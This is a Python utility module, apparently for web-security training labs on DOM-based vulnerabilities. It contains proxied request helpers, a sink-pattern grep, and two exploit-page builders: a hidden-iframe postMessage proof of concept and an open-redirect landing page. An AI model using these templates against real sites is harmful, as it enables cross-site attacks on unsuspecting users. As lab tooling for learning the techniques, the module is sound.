"""
utils.py — shared helpers for the DOM-based Vulnerabilities module labs.

📝 Note: like Clickjacking, most of these exploits are delivered as a crafted
HTML page hosted on the exploit server — the vulnerable code runs entirely
in the VICTIM's browser (web messages, cookie parsing, DOM clobbering all
happen client-side). requests/proxies.py are only used to sanity-check page
source for the sink/source patterns before building the PoC.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def fetch_page_source(session, url):
    """Pull raw HTML/JS so we can eyeball the actual sink before guessing payloads."""
    r = session.get(url)
    log(f"Fetched {url} ({len(r.text)} bytes)")
    return r.text


def grep_for_patterns(source, patterns):
    """Quick client-side-sink spotting: which of these strings appear in the page?"""
    found = {p: (p in source) for p in patterns}
    for p, hit in found.items():
        log(f"  {'FOUND' if hit else 'absent'}: {p!r}", ok=hit)
    return found


def build_postmessage_poc(iframe_src, message_payload, target_origin="*"):
    """
    Standard web-message exploit shape: load the vulnerable page in an
    invisible iframe, then once it's loaded, postMessage() our payload at it.
    `message_payload` should already be a JS expression (string, object
    literal, or JSON.stringify'd string) — not pre-escaped for you.
    """
    return f"""<iframe src="{iframe_src}" onload="postmessage()"></iframe>
<script>
  function postmessage() {{
    document.getElementsByTagName('iframe')[0].contentWindow.postMessage({message_payload}, '{target_origin}');
  }}
</script>"""


def build_open_redirect_poc(vulnerable_redirect_url, payload_destination):
    """A page that just lands the victim on the vulnerable redirect with our destination set."""
    return f'<script>window.location = "{vulnerable_redirect_url}{payload_destination}"</script>'
